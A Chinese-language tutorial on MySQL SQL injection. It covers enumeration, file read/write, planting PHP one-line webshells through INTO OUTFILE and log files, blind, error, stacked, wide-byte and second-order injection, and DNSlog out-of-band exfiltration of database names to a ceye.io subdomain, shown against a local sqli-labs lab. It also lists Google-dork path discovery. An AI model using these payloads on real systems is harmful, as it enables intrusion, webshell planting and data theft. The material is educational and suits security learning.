### *SQL 注入（一）*

SQL 注入就是指 Web应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

##### *SQL 注入产生的条件*

● 传递给后端的**参数是可以控制的**

● **参数内容会被带入到数据库查询**

● 变量未存在过滤或者过滤不严谨

##### *MySQL 注入*

![img](https://i-blog.csdnimg.cn/blog_migrate/9dd66fdcf142b3a2a6204fbef2e34256.png)

##### *SQL 注入中 MySQL 常用函数*

收集操作系统、数据库版本、数据库名字、数据库用户等信息，为后续注入做准备

```
# 一些SQL注入常用的函数
version()                 # 查看数据库版本
database()                # 查看当前数据库名
user()                    # 查看当前数据库用户
system_user()             # 查看系统用户名
group_concat()            # 把数据库中的某列数据或某几列数据合并为一个字符串
@@datadir                 # 查看数据库路径
@@version_compile_os      # 查看操作系统

```

##### *关于 MySQL 数据库*

在  MySQL5.0 版本后，**MySQL** 默认在数据库中存放一个 **information_schema** 的数据库，该数据库中包含了当前系统中所有的数据库、表、列、索引、视图等相关的元数据信息，是 MySQL 自身信息元数据的存储库，我们需要记住三个表名，分别是 **schemata , tables , columns**

```
schemata         # 存储的是该用户创建的所有数据库的库名，要记住该表中记录数据库名的字段名为 schema_name。
tables           # 存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表名的字段分别是 table_schema 和 table_name.
columns          # 存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table_schema、table_name、column_name。

```

![img](https://i-blog.csdnimg.cn/blog_migrate/57b7d058d289b01ef2840141de865f09.png)

```
# 查询所有的数据库名
select schema_name from information_schema.schemata limit 0,1
# 查询指定数据库security中的所有表名
select table_name from information_schema.tables where table_schema='security' limit 0,1
# 查询指定数据库security中的指定数据表users的所有列名
select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1

```

***关于Mysql注释***

在 Sql 注入中，需要使用 Mysql 的注释符号，需要去注释注入语句后面的语句不被执行，Mysql中单行注释有两种方式，分别是 # 和 --  ( -- 后面有空格)
但是，需要注意的是，在 url 中，如果是  get  请求，解释执行的时候， url 中 # 号是用来指导浏览器动作的，对服务器端无用。所以，HTTP 请求中使用 get 传参时不包括 # ，因为使用 # 闭合无法注释，会报错；而使用 -- （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 --+ 的方式来闭合，因为 + 会被解释成空格。

- `也可以使用--%20，把空格转换为url encode编码格式，也不会报错。同理把 # 变成 %23 ,也不报错。`
- `如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如我们在后台登录框中进行注入。`

##### *Mysql跨库注入*

跨库注入是指攻击者可以通过注入攻击代码来执行对其他数据库的操作。攻击者可以使用这种技术来获取或修改其他数据库的数据，包括敏感信息的泄露、恶意代码的执行、修改或删除数据等。跨库注入首先需要明确注入点的权限，若不是root权限或者管理员权限，那么无法执行跨库注入，只有高权限才能执行跨库注入。
简单来说，跨库注入就是在同一个数据库管理系统中，在某一个点存在SQL注入，而通过这点查询到，该权限为 root 权限，那么就可以使用这种方式去操作同数据库下的其它网站数据库，这样就实现的跨库注入。

##### *Mysql文件读写*
MySQL 读写文件方法大致有这几个：`load_file()  、  load data infile()  、 into outfile  、  into dumpfile`

`进行文件读写需要满足的条件：`

`● secure_file_priv值允许对该路径下的文件进行操作`
`  secure_file_priv的值说明：`
`	● 值为NULL，表示禁止文件的导入与导出`
`	● 值为某一目录，表示只能对该目录下的文件导入与导出`
`● 值为空，表示不对文件的读写进行限制`
`在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。可`
`以通过以下方式修改：`
`1. 在windows中，修改mysql.ini 文件，在[mysqld] 下添加条目: secure_file_priv =`
`2. 在Linux中在/etc/my.cnf的[mysqld]下面添加secure_file_priv = ''选项`
`● 数据库用户对文件有读权限`
`● 知道文件的完整路径`
`● 文件大小小于max_allowed_packet(load_file()函数受到这个值的限制)(查看方法：show global variables like 'max_allowed%';)`

##### *1）文件读取函数*

- `load_file()`
  `load_file()`除了读取本地文件，同样也支持网络路径

  ![img](https://i-blog.csdnimg.cn/blog_migrate/0df6d4f6fda56e9b5f071783b9d64e0a.png#pic_center)

`●  load data infile`
使用 `local` 需要设置`local_infile`开启，该变量默认为ON，可以使用以下命令查看：`SHOW GLOBAL VARIABLES LIKE 'local_infile' `。果指定`local`关键词`"load data local infile <文件路径> into TABLE <表名>"`，则表明从客户主机读文件：

```
如果指定的文件路径为绝对路径，则客户机从根目录开始查找该文件。
如果指定的文件路径为相对路径，则客户机从当前目录开始查找该文件。
```

如果没指定`local`关键词`"load data infile <文件路径> into TABLE <表名>"`，则文件必须位于服务器上：

```
如果指定的文件路径为绝对路径，则服务器从根目录开始查找该文件。
如果指定的文件路径为相对路径，则服务器从数据库的数据目录中开始查找该文件。
```

![img](https://i-blog.csdnimg.cn/blog_migrate/729f891f6f7b6b77b5db8667c5cc10a0.png#pic_center)

```
load_file()和load data infile读取文件可以直接读取，也可以新建一个表，读取文件为字符串形式插入表中，然后读出表中数据。
常见的读取的敏感数据：https://www.cnblogs.com/Loong716/p/9891152.html
```

##### 2）文件写入函数

- `into outfile`

  ```
  # 语法格式：
  SELECT column1,column2,...
  FROM table_name
  WHERE condition        
  INTO OUTFILE 'file_path'         # 指定文件所在的路径
  FIELDS TERMINATED by 'char';     # 每一条记录的数据之间默认以 Tab 分隔，也可使用 	FIELDS TERMINATED 参数指定分隔符
  
  ```

  ![img](https://i-blog.csdnimg.cn/blog_migrate/75c1ff1e06940bc386f2ae5a659c8c48.png)

`● into dumpfile`

```
# 语法格式
SELECT column1, column2, ...
FROM table_name
INTO DUMPFILE 'file_path'
[options]

```

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a821ea1cc403acb8edfa1ea545f3bf3f.png)

```
into outfile和into dumpfile的区别

● 导出的行数不一样。outfile函数可以导出（导出数据库数据，写入文件）多行数据；而dumpfile只能导出一行数据
● 是否转义输出。outfile对导出内容中的\n等特殊字符进行了转义，并且在文件内容的末尾增加了一个新行；而dumpfile对文件内容是原意写入，未做任何转移和增加。所以基于此在UDF提权中一般使用dumpfile进行dll文件写入
● 是否允许二进制文件。outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中很棘手，因为会自动将单引号转义成\',请千万注意；但dumpfile，后面的路径可以是单引号、0x、char转换的字符，但是路径中的斜杠是/而不是\。因为dumpfile允许写二进制文件

```

##### 3）基于Mysql写入shell的方式

- **基于文件写入函数`into outfile`和`into dumpfile`写入shell**

```
# 将一句话木马"<?php eval($_REQUEST[1]);?>"通过十六进制编码写入网站根目录
?id=-3')) union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile 'C:\\Users\\Administrator.WIN2012\\Desktop\\phpStudy\\WWW\\outfile.php' --+

```

**● 基于全局日志的写入**
基于全局日志的写入方式，适用于`secure_file_priv`这个配置参数限制了文件写入函数`into outfile`或`into dumpfile`函数的使用，没有写权限。有root权限，能够执行sql语句，并且网站的绝对路径且具有写入权限。查看日志配置，关注日志监测是否开启，然后修改日志路径，来写入shell

```
	# 查看全局日志配置，包括log日志的开启状态和日志文件存储位置
show variables like "%general%";
# 开启日志监测
set global general_log = on;
# 设置需要写入的路径
set global general_log_file = 'file path';
# 然后执行sql语句，mysql会将我们执行的语句记录到日志文件(上一步修改后的文件)中
select "<?php eval($_POST['shell']);?>";
# 结束后，再修改为原来的路径
set global general_log_file = '原来的路径';
# 关闭日志记录
set global general_log = off;

```

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/230ae102c2b59e2eae26ad9295415f84.png)

● **基于慢查询日志的写入**
慢日志记录的是执行时间超过一定时间的语句，默认的执行时间为10秒，通常情况下执行sql语句时的执行时间一般不会超过10s，所以说慢日志文件应该是比较小的，而全局日志记录文件会记录大量数据，可能会影响我们写入的内容。

```
# 查询慢日志功能开启状态以及慢日志目录 
show variables like '%slow_query_log%';
# 查看服务器默认时间值方式
show global variables like '%long_query_time%';
# 开启慢日志功能
set global slow_query_log = 'ON';
# 设置慢日志路径
set global slow_query_file = 'file path';
# 写入shell
select '<?php eval($_REQUEST["a"]);?>' or sleep(11);

```

   ***路径获取常见方法***
文件读写的前提是获取到目标网站的相关文件路径，常见的获取文件路径的方法：

**● 报错显示**
网站报错时，会显示一些路径信息，可以使用谷歌语法搜素，结合关键字搜索出错页面的网页快照，常见关键字有`warning`和`fatal error`。注意，如果目标站点是二级域名，site接的是其对应的顶级域名

```
site:xxx.edu.tw "warning"
site:xxx.com.tw "fatal error"

```

● **遗留文件**
很多网站的根目录下都存在测试文件，可以利用这些测试文件获取绝对路径，例如类似`phpinfo()`。

```
www.xxx.com/test.php
www.xxx.com/ceshi.php
www.xxx.com/info.php
www.xxx.com/phpinfo.php
www.xxx.com/php_info.php
www.xxx.com/1.php

```

**漏洞报错**

包括单引号爆路径和错误参数值爆路径。对于单引号爆路径，直接在URL后面加单引号（例如：www.xxx.com/news.php?id=149'），要求单引号没有被过滤服务器默认返回错误信息；对于错误参数值爆路径，将要提交的参数值改成错误值（例如：www.xxx.com/researcharchive.php?id=-1），比如-1、-99999、…等，单引号被过滤时不妨试试。


**平台配置文件**
如果存在Sql注入点有文件读取权限，就可以手工`load_file`或工具读取配置文件，再从中寻找路径信息。各平台下Web服务器和PHP的配置文件默认路径可以上网查。

```
Windows:
c:\windows\php.ini                                  // php配置文件
c:\windows\system32\inetsrv\MetaBase.xml            // IIS虚拟主机配置文件
Linux:
/etc/php.ini                                        // php配置文件
/etc/httpd/conf/httpd.conf                          // Apache配置文件
/usr/local/apache/conf/extra/httpd-vhosts.conf      // 虚拟目录配置文件
...

```

***Sql注入类型***
**1、按照注入点类型来分类**
**● 数字型注入点**
类似结构 `http://xxx.com/users.php?id=1` 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 "select * from 表名 where id=1" 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

```
select * from 表名 where id=1 and 1=1
# 数字型驻点常见的注入语句(Payload)
# 查询数据库名和版本
id=-1 union select 1,database(),version() --+    
# 查询指定数据库中的表名
id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security') --+   
# 查询指定数据库中指定表名中的列名字段
id=-1 union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users') --+
# 查询指定表中的数据
id=-1 union select 1,database(),(select group_concat(username,':',password) from secyrity.users) --+  

```

**● 字符型注入点**
类似结构 `http://xxx.com/users.php?name=admin` 这种形式，其注入点 `name` 类型为字符类型，所以叫`字符型注入点`。这一类的 SQL 语句原型大概为 `"select * from 表名 where name='admin'"` 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

```
select * from 表名 where name='admin' and 1=1 ''
# 字符型常见的注入语句(Payload)
# 后台语句 - SELECT * FROM users WHERE id=('$id') LIMIT 0,1
id=-1') union select 1,database(),version() --+
id=-2") union select 1,2,3--+

```

**●  搜索性注入点**
这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 `keyword=关键字` ，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

```
select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'
```

**2、按照数据的提交方式**
`● Get注入`
提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接`http://xxx.com/news.php?id=1` ，id 是注入点。
`● Post注入`
使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。
`● Cookie注入`
HTTP 请求的时候会带上客户端的 `Cookie`， 注入点存在 Cookie 当中的某个字段中。
`● Http头部注入`
注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。

**3、按照执行效果**

**1）. 报错注入**
在页面有可控的输入，但是页面没有信息展示，即使注入了sql命令，也没有任何信息显示，可以利用报错信息将数据输出；在 MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：`extractvalue()`、`updatexml()`

● 使用`ExtractValue()`函数报错注入的原理
当使用`extractvalue(xml_frag, xpath_expr)`函数时，若`xpath_expr`参数不符合`xpath`格式，就会报错。而`~`符号(ascii编码值：0x7e)是不存在`xpath`格式的， 所以一旦在`xpath_expr`参数中使用~符号，就会产生`xpath syntax error` (xpath语法错误)，并利用 `concat()` 函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。通过使用这个方法就可以达到报错注入的目的。
![img](https://i-blog.csdnimg.cn/blog_migrate/d5b18a66a22d18eca58b01b39a1b5ba2.png)

`注意：在MySQL 8.0版本中，EXTRACTVALUE()函数已被弃用，并且不推荐使用。替代方案是使用更现代的XML函数和操作符，如XMLQuery、XPATH等。`

**● 使用UpdateXML()函数报错注入的原理**

`UpdateXML(xml_target, xpath_expr, new_xml)`函数报错注入的原理和`ExtractValue()`函数类似

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/cda73828cbf7d177c9e1e1bb26adf254.png)

2）、 盲注
盲注又可以分为布尔盲注和时间盲注。

● `Boolean`型盲注

Boolean是基于真假的判断（true or false），Boolean盲注适用场景是不管输入什么，结果都只返回真或假两种情况。Boolean型盲注的关键在于通过表达式结果与已知值进行比对，根据比对结果判断正确与否。盲注有时需要一个一个字符去猜，因此一些字符串操作的函数经常被用到。

`布尔盲注使用时分为两个步骤：`

`使用 length()函数 判断查询结果的长度`
`使用 substr()函数 截取每一个字符，并穷举出字符内容`

```
# 盲注常用到的sql函数
length()        # 返回查询字符串的长度
mid(a, b, c)    # 截取字符串，从b位置开始(从1开始)，截取字符串a的c位
substr(a, b, c) # 截取字符串，从b位置开始，截取字符串a的c长度
left(a,b)       # 截取字符串，从左侧截取a的前b位
ord()           # 返回字符的ASCII码
ascii()         # 返回字符的ASCII码
```

**● 时间盲注**
时间盲注又称延迟注入，适用于页面不会返回错误信息，只会回显一种界面，其主要特征是利用`sleep`函数让mysql执行时间变长，制造时间延迟，通过页面的响应时间来判断条件是否正确。通常与`if(expr1,expr2,expr3)`语句结合使用（如果expr1是True，则返回expr2，否则返回expr3）

```
# 判断闭合符号：由于页面无法返回正确或错误的值，所以只能通过if加sleep函来判断闭合
?id=1' and if(1=2, 1, sleep(3))--+        # 判断是否是单引号闭合，如果是页面会延迟响应3秒
?id=1" and sleep(3)--+                    # 也可以直接使用and拼接sleepl来判断
```

当判断完是何种闭合方式之后，可以结合`length()`、`ascii()`和`substr()`等函数去进一步判断数据库名长度，数据库名

```
# 常见的注入语句(Payload)
?id=1' and if(length(database())>8, sleep(2), 0) --+               # 判断数据库名长度
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+    # 通过ASCII码，判断数据库的第一个字母，然后通过改变截取的字符，进一步判断库名
# 判断表名
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))=101,sleep(2),0) --+
# 判断列名
?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name="users" and table_schema=database() limit 0,1),1,1))=105,sleep(2),1) --+

```

**3）、 堆叠注入**
**● 堆叠注入原理**
`Stacked injection`汉语翻译过来后，称为堆查询注入，也称之为堆叠注入，顾名思义，就是将语句堆叠在一起进行查询。在PHP中，`mysql_multi_query()`支持多条sql语句同时执行，分号;是用来表示一条sql语句的结束。当我们在`;`结束一个sql语句后继续构造下一条语句，使其执行，就构成了堆叠注入。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/71d3bf9d61848e26371c5d32ab8a7460.png)

**● 堆叠注入的局限性**
堆叠注入的触发条件很苛刻，在实际中遇到的很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句并且目标未对`;`号进行过滤时才能够使用，在PHP中利用`mysqli_multi_query()`函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是`mysqli_ query()`函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限

**4）、 宽字节注入**
**● 什么是宽字节**
字符大小为一个字节时为窄字节，比如 `ASCII` 编码(0-127)，字符大小为两个及以上的字节为宽字节。英文26个字符所以1个字节就够用了，而汉字字符数太多，一个字节显然不够用。宽字节注入利用Mysql的一个特性，Mysql在使用`GBK`编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。

**● 宽字节注入原理**
为了防止网站被SQL注入，一些网站开发人员会做一些防护措施，其中最常见的就是对一些特殊字符进行转义，在PHP中，使用`magic_quotes_gpc`(魔术引号)或者 `addslashes()`函数，对用户提交的数据，如有：post、get、cookie过来的数据增加转义符`\` 以确保这些数据不会引起程序错误。当我们输入的引号被转义之后只当作了一个字符串，无法实现包裹字符串的作用了。如何让转义`\`失去转义的作用，此时，就可以使用宽字节注入。
宽字节编码就是一个字符可能是好几个字节，例如，我们中国的汉字由偏旁和部首组成，如“和”由“禾”+“口” 组成，那么，“禾”+“口”=“和”，这个过程的两个字组成了一个字，既没有了禾的意思也没有了口的意思。变成了和的意思。那让转义符\失去转义作用的方法，类似于这个汉字的构成，可以说是异曲同工之妙。 `\`转义通过URL编码是`%5c`。那么找到一个与 `%5c` 的另一半，让他们组成一个新字符不就OK了吗？哪个字节编码能让他们组成一个新字符呢？很多，eg：%df …，%df%5c。这两个在一块就组成了一个新的字符，准确的说是一个汉字，那么我们输入的引号的特殊意义就存在，可以是包裹字符串的了。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/c3e87e6a385d8013041c586ec76ae001.png)

##### 5）、 二次注入

- **二次注入的原理**

  二次注入一般无法通过扫描工具、手工注入或黑盒测试去进行，一般是用于白盒测试，原因是漏洞本身产生的原理。二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 语句中导致的注入。二次注入比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。
  二次注入可分为两步：
  	1、插入恶意数据
  进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。
  	2、引用恶意数据
  开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验处理。

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/23f824ed5025312e190bd94b37374443.png)

**6）、 DNSlog带外注入**
**● 什么是 DNSlog 注入**
DNSlog 注入，也叫DNS带外查询，它是属于带外通信的一种(Out of Band,简称OOB)。通常的注入基本都是在同一个信道上面的，比如正常的get注入，先在url上插入payload做HTTP请求，然后得到HTTP返回包，没有涉及其他信道。而所谓的带外通信，至少涉及两个信道，它利用DNS解析渠道，将数据带出。
对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog注入可以减少发送的请求，直接回显数据实现注入。使用DnsLog盲注仅限于Windos环境。

**● Dnslog注入原理**
如图，攻击者首先构造注入语句`load_file(concat('\\\\',database(),'.test.com\\abc'))`，在数据库中database()函数被执行，由`concat()`函数将执行结果与`.test.com\\abc`拼接，构成一个新的域名，而mysql中的`select load_file()`可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。
DNS在解析的时候会留下日志，攻击者就是通过读取多级域名的解析日志，来获取数据库信息。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/459dbcb0ca3dbc35e5d5aa1ab2ee0ed0.png)

**● 如何获取DNS查询记录日志**
可以使用开放的Dnslog平台，如：`http://www.dnslog.cn`、`http://ceye.io`等，在上`http://ceye.io`我们可以获取到有关ceye.io的DNS查询信息。实际上在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在ceye.io时，它会将这条域名信息转到相应的NS服务器上，而通过http://ceye.io我们就可以查询到这条DNS解析记录。

**● 使用场景和条件**
1、`dnslog注入只能用于windows平台`，因为`load_file`这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个`//`，这两个斜杠的目的是为了使用`load_file`可以查询的unc路径。但是Linux服务器没有unc路径，也就无法使用dnslog注入。
2、sql的布尔型盲注、时间注入的效率普遍很低且当注入的线程太大容易被waf拦截，并且像一些命令执行，xss以及sql注入攻击有时无法看到回显结果，这时就可以考虑DNSlog注入攻击
3、`load_file()`函数可以使用，也就是说需要数据库配置文件`my.ini`中的`secure_file_priv=`

**● 靶场演示**
这里我就使用[http://ceye.io](http://ceye.io/), 它是一个免费的记录dnslog的平台，注册后到Profile页面会给你一个二级域名：`xxx.ceye.io`

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/db255b19550a6b2bdd65c3d75649f334.png)

以sqlilabs靶场的less-10为例，是sql盲注，注入后不会有回显,使用DNSlog来解决!

```
# 使用Payload来判断闭合方式，为双引号闭合
http://localhost:8888/sqli-labs/Less-10/index.php?id=1" and sleep(2)--+

```

构造Payload，报数据库名，然后在自己的ceye.io平台上查看DNSquery,发现解析记录，可以看到数据库名security

```
# Payload2，其中，concat可以拼接字符，load_file()用于读取文件，'\\\\'有两个\用于转义，转义后代表\\
http://localhost:8888/sqli-labs/Less-10/index.php?id=1" and load_file(concat('\\\\',database(),'.xxx.ceye.io\\abc'))--+

```

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8dee984c20146b890d80afd2c600725c.png)

可以进一步构造Payload，去报表名

```
http://localhost:8888/sqli-labs/Less-10/index.php?id=1" and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.xxx.ceye.io\\abc'))--+

```

```
注意：
1、DNSlog带外注入满足的前提：

注入点必须是高权限，因为涉及到文件读取（注意数据库中secure_file_priv的值）；
DnsLog带外注入仅限于windos环境。
2、在进行注入的时候，需要先使用测试代码判断该位置是否存在注入，然后再在后面拼接代码，因为对照pyload进行输入的话，可能会出现dnslog网站接收不到的情况。

3、在域名的后面，我们需要拼接一个文件名，这是因为load_file函数只能请求文件，如果不加后面的文件名，同样无法得到显示。

```

